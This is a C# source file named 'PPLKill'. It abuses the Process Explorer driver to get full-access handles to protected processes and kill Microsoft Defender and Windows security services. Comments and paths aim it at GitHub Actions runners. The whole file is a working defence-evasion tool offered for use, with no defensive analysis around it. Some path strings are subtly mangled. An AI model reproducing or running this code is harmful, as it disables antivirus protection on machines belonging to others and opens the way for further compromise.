using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.IO;

// PPLKill using Process Explorer driver (procexp152.sys)
// IOCTL 0x0022E030: open process with PROCESS_ALL_ACCESS bypassing PPL
// Driver is auto-loaded by procexp64.exe which ships on GitHub Actions runners.
// Based on research by Jonas Lykkegaard (@jonasLyk)

class PPLKill {
    [StructLayout(LayoutKind.Sequential)]
    struct PROCEXP_OPEN_PROCESS {
        public uint ProcessId;
        public uint DesiredAccess;
        public IntPtr ProcessHandle; // out
    }

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    static extern IntPtr CreateFile(string fn, uint access, uint share,
        IntPtr sa, uint cd, uint flags, IntPtr tmpl);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool DeviceIoControl(IntPtr dev, uint code,
        ref PROCEXP_OPEN_PROCESS inBuf, uint inSz,
        ref PROCEXP_OPEN_PROCESS outBuf, uint outSz,
        out uint ret, IntPtr ovl);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool TerminateProcess(IntPtr h, uint code);

    [DllImport("kernel32.dll")]
    static extern bool CloseHandle(IntPtr h);

    const uint GENERIC_READ_WRITE = 0xC0000000;
    const uint FILE_SHARE_RW = 3;
    const uint OPEN_EXISTING = 3;
    const uint IOCTL_PROCEXP_OPEN_PROCESS = 0x0022E030;
    const uint PROCESS_ALL_ACCESS = 0x001FFFFF;

    static void Main(string[] args) {
        // Find and launch procexp to load the driver
        string[] searchPaths = {
            @"C:	ools\procexp64.exe",
            @"C:\Program Files\Process Explorer\procexp64.exe",
            @"C:\ProgramData\chocolatey	ools\procexp64.exe",
            @"C:\Windows\System32\procexp64.exe",
        };

        // Also search GITHUB_WORKSPACE and common tool paths
        var allPaths = new System.Collections.Generic.List<string>(searchPaths);
        string ws = Environment.GetEnvironmentVariable("GITHUB_WORKSPACE") ?? "";
        if (ws != "") allPaths.Add(Path.Combine(ws, "procexp64.exe"));
        
        // Try to find it via where.exe
        try {
            var wp = Process.Start(new ProcessStartInfo("where", "procexp64.exe") {
                RedirectStandardOutput = true, UseShellExecute = false
            });
            string found = wp.StandardOutput.ReadLine();
            if (found != null && File.Exists(found)) allPaths.Insert(0, found.Trim());
        } catch {}

        string procexpPath = null;
        foreach (var p in allPaths) {
            if (File.Exists(p)) { procexpPath = p; break; }
        }

        // Also check running processes — procexp might already be running
        bool driverAlreadyLoaded = false;
        var hDev = CreateFile(@"\.\PROCEXP152", GENERIC_READ_WRITE, FILE_SHARE_RW,
            IntPtr.Zero, OPEN_EXISTING, 0, IntPtr.Zero);
        if (hDev != new IntPtr(-1)) {
            Console.WriteLine("procexp152.sys already loaded");
            driverAlreadyLoaded = true;
        } else {
            CloseHandle(hDev);
            hDev = IntPtr.Zero;
        }

        Process procexpProc = null;
        if (!driverAlreadyLoaded && procexpPath != null) {
            Console.WriteLine($"Launching {procexpPath} to load driver...");
            procexpProc = Process.Start(new ProcessStartInfo(procexpPath, "/accepteula") {
                WindowStyle = ProcessWindowStyle.Minimized
            });
            System.Threading.Thread.Sleep(3000);

            hDev = CreateFile(@"\.\PROCEXP152", GENERIC_READ_WRITE, FILE_SHARE_RW,
                IntPtr.Zero, OPEN_EXISTING, 0, IntPtr.Zero);
            if (hDev == new IntPtr(-1)) {
                // Try PROCEXP153 (newer versions)
                hDev = CreateFile(@"\.\PROCEXP153", GENERIC_READ_WRITE, FILE_SHARE_RW,
                    IntPtr.Zero, OPEN_EXISTING, 0, IntPtr.Zero);
            }
        }

        if (hDev == IntPtr.Zero || hDev == new IntPtr(-1)) {
            Console.WriteLine("ERROR: Could not open procexp device");
            procexpProc?.Kill();
            Environment.Exit(1);
        }

        string[] targets = { "MsMpEng", "MpDefenderCoreService", "NisSrv",
                              "MsMpEngCP", "SecurityHealthService", "MpCopyAccelerator" };

        foreach (var name in targets) {
            foreach (var proc in Process.GetProcessesByName(name)) {
                var req  = new PROCEXP_OPEN_PROCESS { ProcessId = (uint)proc.Id, DesiredAccess = PROCESS_ALL_ACCESS };
                var resp = new PROCEXP_OPEN_PROCESS();
                uint bytesRet;
                bool ok = DeviceIoControl(hDev, IOCTL_PROCEXP_OPEN_PROCESS,
                    ref req, (uint)Marshal.SizeOf(req),
                    ref resp, (uint)Marshal.SizeOf(resp),
                    out bytesRet, IntPtr.Zero);
                if (ok && resp.ProcessHandle != IntPtr.Zero) {
                    bool killed = TerminateProcess(resp.ProcessHandle, 1);
                    Console.WriteLine($"[{(killed ? "KILLED" : "FAIL")}] {name} pid={proc.Id} handle=0x{resp.ProcessHandle.ToInt64():X}");
                    CloseHandle(resp.ProcessHandle);
                } else {
                    Console.WriteLine($"[NOHANDLE] {name} pid={proc.Id} err={Marshal.GetLastWin32Error()}");
                }
            }
        }

        CloseHandle(hDev);
        procexpProc?.Kill();
    }
}
